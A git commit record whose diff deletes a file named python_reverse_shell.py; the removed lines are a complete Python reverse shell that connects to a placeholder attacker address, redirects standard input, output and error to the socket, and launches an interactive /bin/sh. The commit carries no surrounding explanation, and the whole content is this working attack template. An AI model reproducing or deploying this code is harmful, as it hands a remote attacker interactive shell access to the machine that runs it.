a104e0de64dc5b366129dde38a5e9864b90adb0d
J™ <98712338+LineyGH@users.noreply.github.com>
2024-11-17 20:26:19 +0000

    Delete python_reverse_shell.py

--- python_reverse_shell.py
+++
@@ -1,8 +0,0 @@
-import socket, subprocess, os
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("attacker_ip", attacker_port))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-subprocess.call(["/bin/sh", "-i"])
